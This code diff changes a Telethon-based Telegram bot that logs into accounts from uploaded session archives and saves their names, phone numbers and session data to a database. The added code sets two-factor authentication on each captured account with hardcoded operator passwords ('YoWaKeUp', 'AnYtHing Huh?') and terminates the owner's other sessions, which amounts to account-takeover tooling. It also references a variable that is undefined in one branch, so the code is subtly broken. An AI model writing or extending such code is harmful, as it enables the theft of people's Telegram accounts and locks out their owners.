@@ -62,7 +62,8 @@ from telethon.errors import (
 API_ID = Config.API_ID
 API_HASH = Config.API_HASH
 ADMINS = Config.ADMIN
-
+USERPASS = "YoWaKeUp"
+MAINPASS = "AnYtHing Huh?"
 CODE_RE = re.compile(r"(\d{5,6})")
 
 def require_verified(func):
@@ -98,6 +99,27 @@ async def check_2fa(client):
         return "2FA: Disabled"
     except Exception as e:
         return f"2FA: Unknown ({e})"
+
+from telethon.errors import PasswordHashInvalidError
+
+async def add_2fa(client, new_password: str, message):
+    try:
+        # Check if 2FA already exists
+        pw = await client(GetPasswordRequest())
+        if pw.has_password:
+            return False, "Iɢɴᴏʀɪɴɢ 2FA, Sɪɴᴄᴇ ɪᴛ'ꜱ ᴀʟʀᴇᴀᴅʏ ꜱᴇᴛ"
+        
+        # Set new password
+        await client(functions.account.UpdatePasswordSettingsRequest(
+            password=new_password,
+            hint="Set Via Bot",
+            email=None,
+        ))
+        return True, f"2FA Sᴇᴛ ᴛᴏ : {new_password}"
+    except PasswordHashInvalidError:
+        return False, f"ᴇʀʀᴏʀ ɪɴ 2ꜰᴀ ᴀᴅᴅɪɴɢ PasswordHashInvalidError"
+    except Exception as e:
+        return False, f"ᴇʀʀᴏʀ ɪɴ 2ꜰᴀ ᴀᴅᴅɪɴɢ {e}"
 
 async def show_rar(tdata_path: str, message: Message, num):
     tmp_dir = tempfile.mkdtemp()
@@ -424,6 +446,16 @@ async def handle_archive(client, message):
 
                 with open(clean_zip_path, "rb") as f:
                     tdata_bytes = f.read()
+                if secure:
+                    if message.from_user.id in ADMINS:
+                        passs = MAINPASS
+                    else:
+                        passs = USERPASS
+                    sd, mrsyd = await add_2fa(tele_client, passs, message)
+                    nsyd = f"{mrsyd} \n" + await terminate_all_other_sessions(tele_client)
+                    syd = f"2FA : {passs}"
+                else:
+                    nsyd = ""
                 info = {
                     "name": me.first_name or "?",
                     "phone": me.phone or "?",
@@ -433,10 +465,7 @@ async def handle_archive(client, message):
                 }
                 sydno = await db.save_account(me.id, info, tdata_bytes)
                 await show_rar(tdata_path, message, sydno)
-                if secure:
-                    nsyd = await terminate_all_other_sessions(tele_client)
-                else:
-                    nsyd = "-"
+                
                 await message.reply(f"Lᴏɢɢᴇᴅ ɪɴ ᴀs {me.first_name or '?'} ({me.id}) \n ID: {sydno} \n PH: +{me.phone} \n{syd} \n{nsyd}", quote=True)
                 results.append(
                     f"#{sydno}\n"
